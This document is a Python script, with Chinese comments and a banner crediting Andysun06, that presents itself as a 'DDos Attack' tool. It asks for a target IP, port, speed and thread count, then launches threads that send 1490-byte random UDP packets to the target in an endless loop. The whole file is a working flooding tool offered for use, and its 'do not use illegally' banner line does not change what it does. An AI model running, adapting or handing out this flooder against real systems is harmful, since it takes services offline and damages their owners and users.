import sys
import os
import time
import socket
import random
import threading  # 导入多线程模块
from datetime import datetime

# 获取当前时间（未使用，但保留）
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# 创建 UDP 套接字和随机数据
bytes = random._urandom(1490)  # 1490 字节的随机数据包

# 攻击函数（每个线程执行）
def attack(ip, port, speed, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # 每个线程独立创建套接字
    sent = 0
    while True:
        try:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print(f"线程 {thread_id} 已发送 {sent} 个数据包到 {ip} 端口 {port}")
            time.sleep((1000 - speed) / 2000)  # 根据速度控制发送间隔
        except KeyboardInterrupt:  # 允许 Ctrl+C 退出
            print(f"线程 {thread_id} 已停止")
            break
        except Exception as e:
            print(f"线程 {thread_id} 出错: {e}")
            break

# 主程序
if __name__ == "__main__":
    os.system("clear")
    os.system("figlet DDos Attack")
    print(" ")
    print("/---------------------------------------------------\\")
    print("|   作者          : Andysun06                       |")
    print("|   作者github    : https://github.com/Andysun06    |")
    print("|   kali-QQ学习群 : 909533854                       |")
    print("|   版本          : V1.1.0                          |")
    print("|   严禁转载，程序教程仅发布在CSDN（用户Andysun06）   |")
    print("\\---------------------------------------------------/")
    print(" ")
    print(" -----------------[请勿用于违法用途]----------------- ")
    print(" ")

    # 获取用户输入
    ip = input("请输入 IP     : ")
    port = int(input("攻击端口      : "))
    speed = int(input("攻击速度(1~1000) : "))
    thread_count = int(input("线程数(建议5~20) : "))  # 新增：线程数量

    os.system("clear")
    print(f"开始攻击 {ip}:{port}，使用 {thread_count} 个线程...")

    # 创建并启动线程
    threads = []
    for i in range(thread_count):
        thread = threading.Thread(target=attack, args=(ip, port, speed, i+1))
        thread.start()
        threads.append(thread)

    # 主线程等待所有子线程（可选）
    try:
        for thread in threads:
            thread.join()  # 等待所有线程完成（通常不会结束，除非出错或手动停止）
    except KeyboardInterrupt:
        print("主程序已收到退出信号，正在停止...")
